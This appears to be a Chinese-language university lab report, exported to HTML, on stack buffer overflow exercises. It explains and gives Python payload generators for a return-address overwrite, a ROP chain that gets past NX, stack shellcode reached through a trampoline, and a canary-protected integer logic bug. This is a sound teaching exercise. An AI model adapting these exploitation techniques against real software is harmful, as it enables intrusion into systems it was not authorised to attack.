@@ -1,0 +1,233 @@
+<!DOCTYPE html><html><head>
+      <title>report</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:////home/gal3riel/.vscode-server/extensions/shd101wyy.markdown-preview-enhanced-0.8.20/crossnote/dependencies/katex/katex.min.css">
+      
+      
+      
+      
+      
+      <style>
+      code[class*=language-],pre[class*=language-]{color:#333;background:0 0;font-family:Consolas,"Liberation Mono",Menlo,Courier,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.4;-moz-tab-size:8;-o-tab-size:8;tab-size:8;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:.8em;overflow:auto;border-radius:3px;background:#f5f5f5}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal;background:#f5f5f5}.token.blockquote,.token.comment{color:#969896}.token.cdata{color:#183691}.token.doctype,.token.macro.property,.token.punctuation,.token.variable{color:#333}.token.builtin,.token.important,.token.keyword,.token.operator,.token.rule{color:#a71d5d}.token.attr-value,.token.regex,.token.string,.token.url{color:#183691}.token.atrule,.token.boolean,.token.code,.token.command,.token.constant,.token.entity,.token.number,.token.property,.token.symbol{color:#0086b3}.token.prolog,.token.selector,.token.tag{color:#63a35c}.token.attr-name,.token.class,.token.class-name,.token.function,.token.id,.token.namespace,.token.pseudo-class,.token.pseudo-element,.token.url-reference .token.variable{color:#795da3}.token.entity{cursor:help}.token.title,.token.title .token.punctuation{font-weight:700;color:#1d3e81}.token.list{color:#ed6a43}.token.inserted{background-color:#eaffea;color:#55a532}.token.deleted{background-color:#ffecec;color:#bd2c00}.token.bold{font-weight:700}.token.italic{font-style:italic}.language-json .token.property{color:#183691}.language-markup .token.tag .token.punctuation{color:#333}.language-css .token.function,code.language-css{color:#0086b3}.language-yaml .token.atrule{color:#63a35c}code.language-yaml{color:#183691}.language-ruby .token.function{color:#333}.language-markdown .token.url{color:#795da3}.language-makefile .token.symbol{color:#795da3}.language-makefile .token.variable{color:#183691}.language-makefile .token.builtin{color:#0086b3}.language-bash .token.keyword{color:#0086b3}pre[data-line]{position:relative;padding:1em 0 1em 3em}pre[data-line] .line-highlight-wrapper{position:absolute;top:0;left:0;background-color:transparent;display:block;width:100%}pre[data-line] .line-highlight{position:absolute;left:0;right:0;padding:inherit 0;margin-top:1em;background:hsla(24,20%,50%,.08);background:linear-gradient(to right,hsla(24,20%,50%,.1) 70%,hsla(24,20%,50%,0));pointer-events:none;line-height:inherit;white-space:pre}pre[data-line] .line-highlight:before,pre[data-line] .line-highlight[data-end]:after{content:attr(data-start);position:absolute;top:.4em;left:.6em;min-width:1em;padding:0 .5em;background-color:hsla(24,20%,50%,.4);color:#f4f1ef;font:bold 65%/1.5 sans-serif;text-align:center;vertical-align:.3em;border-radius:999px;text-shadow:none;box-shadow:0 1px #fff}pre[data-line] .line-highlight[data-end]:after{content:attr(data-end);top:auto;bottom:.4em}html body{font-family:'Helvetica Neue',Helvetica,'Segoe UI',Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ol,html body>ul{margin-bottom:16px}html body ol,html body ul{padding-left:2em}html body ol.no-list,html body ul.no-list{padding:0;list-style-type:none}html body ol ol,html body ol ul,html body ul ol,html body ul ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:700;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::after,html body code::before{letter-spacing:-.2em;content:'\00a0'}html body pre>code{padding:0;margin:0;word-break:normal;white-space:pre;background:0 0;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:after,html body pre code:before,html body pre tt:after,html body pre tt:before{content:normal}html body blockquote,html body dl,html body ol,html body p,html body pre,html body ul{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body code,html body pre{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview ul{list-style:disc}.markdown-preview ul ul{list-style:circle}.markdown-preview ul ul ul{list-style:square}.markdown-preview ol{list-style:decimal}.markdown-preview ol ol,.markdown-preview ul ol{list-style-type:lower-roman}.markdown-preview ol ol ol,.markdown-preview ol ul ol,.markdown-preview ul ol ol,.markdown-preview ul ul ol{list-style-type:lower-alpha}.markdown-preview .newpage,.markdown-preview .pagebreak{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center!important}.markdown-preview:not([data-for=preview]) .code-chunk .code-chunk-btn-group{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .status{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .output-div{margin-bottom:16px}.markdown-preview .md-toc{padding:0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link div,.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}.markdown-preview .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0;min-height:100vh}@media screen and (min-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{font-size:14px!important;padding:1em}}@media print{html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc{padding:0 16px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link div,html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% - 300px);padding:2em calc(50% - 457px - 300px / 2);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+      <!-- The content below will be included at the end of the <head> element. --><script type="text/javascript">
+  document.addEventListener("DOMContentLoaded", function () {
+    // your code here
+  });
+</script></head><body for="html-export">
+    
+    
+      <div class="crossnote markdown-preview  ">
+      
+<h1 id="栈溢出攻击实验">栈溢出攻击实验 </h1>
+<h2 id="题目解决思路">题目解决思路 </h2>
+<h3 id="problem-1">Problem 1: </h3>
+<ul>
+<li><strong>分析</strong>：
+<ol>
+<li><strong>漏洞定位：</strong> 通过反汇编代码发现<code>func</code>函数中使用了<code>strcpy</code>将用户输入复制到栈上的缓冲区，且没有进行长度检查，存在栈溢出漏洞。</li>
+<li><strong>栈结构分析：</strong> 缓冲区位于<code>%rbp - 0x8</code>，而函数的返回地址位于<code>%rbp + 0x8</code>。因此，需要填充8字节（Buffer）+ 8字节（Saved RBP）= 16字节的Padding才能触及返回地址。</li>
+<li><strong>攻击目标：</strong> 覆盖返回地址为<code>func1</code>的入口地址<code>0x401216</code>，使得<code>func</code>返回时直接跳转执行<code>func1</code>输出Flag。</li>
+<li><strong>保护机制：</strong> 该题未开启NX保护，也无Canary，是最基础的栈溢出。</li>
+</ol>
+</li>
+<li><strong>解决方案</strong>：
+<ul>
+<li>利用Python脚本生成payload，构造16字节垃圾数据加上目标地址。</li>
+</ul>
+</li>
+</ul>
+<pre data-role="codeBlock" data-info="Python" class="language-python Python"><code><span class="token keyword keyword-import">import</span> struct
+
+<span class="token comment"># 确定Padding长度</span>
+<span class="token comment"># 缓冲区从rbp-0x8开始，返回地址在rbp+0x8</span>
+<span class="token comment"># 距离 = 8(local buffer) + 8(saved rbp) = 16字节</span>
+padding_len <span class="token operator">=</span> <span class="token number">16</span>
+padding <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> padding_len
+
+<span class="token comment"># 确定目标跳转地址 (func1 的地址)</span>
+<span class="token comment"># 根据汇编: 0000000000401216 &lt;func1&gt;</span>
+target_address <span class="token operator">=</span> <span class="token number">0x401216</span>
+
+<span class="token comment"># 将地址打包成64位小端序</span>
+<span class="token comment"># '&lt;Q'代表 little-endian unsigned long long (8 bytes)</span>
+func1_addr <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> target_address<span class="token punctuation">)</span>
+
+<span class="token comment"># 拼接Payload</span>
+payload <span class="token operator">=</span> padding <span class="token operator">+</span> func1_addr
+
+<span class="token comment"># 写入文件</span>
+<span class="token keyword keyword-with">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ans1.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword keyword-as">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword keyword-print">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Payload generated: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> bytes written to ans1.txt"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword keyword-print">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Padding: </span><span class="token interpolation"><span class="token punctuation">{</span>padding_len<span class="token punctuation">}</span></span><span class="token string"> bytes"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword keyword-print">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Target Addr: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>target_address<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+</code></pre><ul>
+<li><strong>结果</strong>：</li>
+</ul>
+<h3 id="problem-2">Problem 2: </h3>
+<ul>
+<li><strong>分析</strong>：
+<ol>
+<li><strong>保护机制：</strong> 题目开启了NX(No-Execute)保护，意味着栈上的数据不可执行，不能直接写入 Shellcode。必须使用ROP(Return Oriented Programming)技术。</li>
+<li><strong>攻击目标：</strong> 调用<code>func2</code>(<code>0x401216</code>)，且要求第一个参数<code>%rdi</code>必须为<code>0x3f8</code>。</li>
+<li><strong>Gadget 寻找：</strong> 在反汇编中找到<code>pop_rdi</code>函数 (<code>0x4012c7</code>)，包含<code>pop %rdi; ret</code>指令。利用该 Gadget 可以将栈上的数据弹入<code>%rdi</code>寄存器。</li>
+<li><strong>Payload 构造：</strong> <code>Padding(16B) </code>-&gt;<code>pop_rdi地址</code>-&gt;<code>参数0x3f8</code>-&gt;<code>func2地址</code>。</li>
+</ol>
+</li>
+<li><strong>解决方案</strong>：</li>
+</ul>
+<pre data-role="codeBlock" data-info="Python" class="language-python Python"><code><span class="token keyword keyword-import">import</span> struct
+
+<span class="token comment"># Padding 长度</span>
+<span class="token comment"># Buffer(rbp-8)到RetAddr(rbp+8)的距离是16字节</span>
+padding_len <span class="token operator">=</span> <span class="token number">16</span>
+padding <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> padding_len
+
+<span class="token comment"># 构造 ROP 链</span>
+<span class="token comment"># Gadget: pop rdi; ret</span>
+pop_rdi_ret_addr <span class="token operator">=</span> <span class="token number">0x4012c7</span>
+
+<span class="token comment"># 参数: func2要求参数为0x3f8</span>
+arg1 <span class="token operator">=</span> <span class="token number">0x3f8</span>
+
+<span class="token comment"># 目标函数:func2</span>
+func2_addr <span class="token operator">=</span> <span class="token number">0x401216</span>
+
+<span class="token comment"># 打包 Payload</span>
+<span class="token comment"># 栈结构: [Padding] + [pop_rdi_addr] + [0x3f8] + [func2_addr]</span>
+payload <span class="token operator">=</span> padding
+payload <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> pop_rdi_ret_addr<span class="token punctuation">)</span> <span class="token comment"># 覆盖原本的返回地址</span>
+payload <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> arg1<span class="token punctuation">)</span>             <span class="token comment"># 这个值会被pop到rdi寄存器中</span>
+payload <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> func2_addr<span class="token punctuation">)</span>       <span class="token comment"># pop rdi后的ret会跳到这里</span>
+
+<span class="token comment"># 写入文件</span>
+<span class="token keyword keyword-with">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ans2.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword keyword-as">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword keyword-print">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Payload generated: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> bytes written to ans2.txt"</span></span><span class="token punctuation">)</span>
+</code></pre><ul>
+<li><strong>结果</strong>：</li>
+</ul>
+<h3 id="problem-3">Problem 3: </h3>
+<ul>
+<li><strong>分析</strong>：
+<ol>
+<li><strong>难点：</strong> 缓冲区非常小（32字节），溢出空间不足以存放完整的ROP链。但栈是可执行的。</li>
+<li><strong>特殊机制：</strong> 发现<code>jmp_xs(0x401334)</code>函数，它会跳转到<code>saved_rsp + 0x10</code>的位置。经过计算，<code>saved_rsp + 0x10</code>正好指向我们输入缓冲区的起始位置。</li>
+<li><strong>攻击策略：</strong> 利用Shellcode配合Trampoline（跳板）。
+<ul>
+<li>将执行<code>func1(0x72)</code>的汇编机器码放在缓冲区开头。</li>
+<li>将返回地址覆盖为<code>jmp_xs</code>的地址。</li>
+<li>函数返回时跳到<code>jmp_xs</code>，<code>jmp_xs</code>再跳回栈顶执行Shellcode。</li>
+</ul>
+</li>
+<li><strong>Shellcode编写：</strong> <code>mov rdi, 0x72; mov rax, 0x401216; call rax</code>。</li>
+</ol>
+</li>
+<li><strong>解决方案</strong>：</li>
+</ul>
+<pre data-role="codeBlock" data-info="Python" class="language-python Python"><code><span class="token keyword keyword-import">import</span> struct
+
+<span class="token comment"># 构造 Shellcode</span>
+<span class="token comment"># 功能：执行 func1(0x72)</span>
+<span class="token comment"># 机器码对应汇编：</span>
+<span class="token comment"># bf 72 00 00 00          mov    edi, 0x72</span>
+<span class="token comment"># 48 c7 c0 16 12 40 00    mov    rax, 0x401216 (func1 addr)</span>
+<span class="token comment"># ff d0                   call   rax</span>
+shellcode <span class="token operator">=</span> <span class="token string">b'\xbf\x72\x00\x00\x00\x48\xc7\xc0\x16\x12\x40\x00\xff\xd0'</span>
+
+<span class="token comment"># 计算 Padding</span>
+<span class="token comment"># 缓冲区总大小是32字节，减去Shellcode的长度</span>
+buffer_size <span class="token operator">=</span> <span class="token number">32</span>
+padding_len <span class="token operator">=</span> buffer_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+padding <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> padding_len
+
+<span class="token comment"># 覆盖 Saved RBP (8字节)</span>
+rbp_padding <span class="token operator">=</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token number">8</span>
+
+<span class="token comment"># 覆盖 Return Address</span>
+<span class="token comment"># 跳转到 jmp_xs (Trampoline)，它会将执行流带回栈上的Shellcode</span>
+jmp_xs_addr <span class="token operator">=</span> <span class="token number">0x401334</span>
+ret_addr <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> jmp_xs_addr<span class="token punctuation">)</span>
+
+<span class="token comment"># 组合 Payload</span>
+<span class="token comment"># [Shellcode] + [Padding] + [Saved RBP] + [jmp_xs]</span>
+payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> padding <span class="token operator">+</span> rbp_padding <span class="token operator">+</span> ret_addr
+
+<span class="token comment"># 写入文件</span>
+<span class="token keyword keyword-with">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ans3.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword keyword-as">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword keyword-print">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Payload generated: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> bytes. Shellcode size: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+</code></pre><ul>
+<li><strong>结果</strong>：</li>
+</ul>
+<h3 id="problem-4">Problem 4: </h3>
+<ul>
+<li><strong>分析</strong>：
+<ol>
+<li><strong>Canary 保护：</strong> 汇编中出现了<code>__stack_chk_fail</code>，说明开启了Stack Canary保护。如果在函数返回前检测到栈上的Canary值被修改（例如被溢出覆盖），程序会直接崩溃。因此无法使用传统的覆盖返回地址的方法。</li>
+<li><strong>代码逻辑审计：</strong> 这道题其实是一道逆向逻辑题。分析<code>func</code>函数发现存在一个特定的输入检查路径。</li>
+<li><strong>关键逻辑：</strong>
+<ul>
+<li>程序将输入值（unsigned int）与<code>0xfffffffe</code>比较。</li>
+<li>进入一个极大次数的循环，将输入值不断减1。</li>
+<li>最终检查：如果<code>(输入值 - 0xfffffffe) == 1</code>且<code>原始输入 == 0xffffffff</code>(-1)，则调用 <code>func1</code>。</li>
+</ul>
+</li>
+<li><strong>解法：</strong> 输入<code>-1</code>。因为<code>-1</code>在无符号数看来是最大值，满足循环条件，且经过计算后满足最终校验。</li>
+</ol>
+</li>
+<li><strong>解决方案</strong>：
+<ul>
+<li>无需二进制溢出，只需构造符合程序读取流程的输入文本。</li>
+</ul>
+</li>
+</ul>
+<pre data-role="codeBlock" data-info="Python" class="language-python Python"><code><span class="token comment"># 第一次scanf (main函数开头)</span>
+<span class="token comment"># 用于凯撒解密演示1，内容不重要</span>
+payload <span class="token operator">=</span> <span class="token string">b'hello\n'</span>
+
+<span class="token comment"># 第二次scanf</span>
+<span class="token comment"># 用于凯撒解密演示2，内容不重要</span>
+payload <span class="token operator">+=</span> <span class="token string">b'world\n'</span>
+
+<span class="token comment"># 第三次scanf(进入func)</span>
+<span class="token comment"># 这是关键：输入-1(即unsigned int的0xffffffff)</span>
+<span class="token comment"># 程序会进行大量的循环计算，最终验证通过</span>
+payload <span class="token operator">+=</span> <span class="token string">b'-1\n'</span>
+
+<span class="token keyword keyword-with">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ans4.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword keyword-as">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword keyword-print">print</span><span class="token punctuation">(</span><span class="token string">"Payload generated for Problem 4."</span><span class="token punctuation">)</span>
+</code></pre><ul>
+<li><strong>结果</strong>：</li>
+</ul>
+<h2 id="思考与总结">思考与总结 </h2>
+<ul>
+<li>本次实验通过四个层层递进的题目，使我深入理解了二进制程序中的典型漏洞及其利用方式：</li>
+</ul>
+<ol>
+<li><strong>基础栈溢出：</strong> 我理解了函数调用栈的布局（Buffer, Saved RBP, Return Address），学会了通过覆盖返回地址控制程序流。</li>
+<li><strong>对抗 NX 保护：</strong> 我理解了当栈不可执行时，传统的Shellcode失效。这时可以通过利用程序自身的代码片段（Gadgets）构造ROP链，实现了在不执行栈上代码的情况下完成参数传递和函数调用。</li>
+<li><strong>受限空间与栈迁移：</strong> 在溢出空间不足以放下ROP链时，我学会了分析程序中的特殊跳转指令（如 jmp_xs），利用“跳板”技术将执行流劫持回栈上的Shellcode，实现了Stack Pivoting的一种变体。</li>
+<li><strong>对抗 Canary 保护：</strong> 当Stack Canary封堵了溢出路径时，攻击思路转向了程序逻辑漏洞。这证明了安全不仅仅是内存破坏，业务逻辑（如整数溢出、边界条件判断）的缺陷同样会导致致命的安全问题。</li>
+</ol>
+<h2 id="参考资料">参考资料 </h2>
+<p>列出在准备报告过程中参考的所有文献、网站或其他资源，确保引用格式正确。</p>
+
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
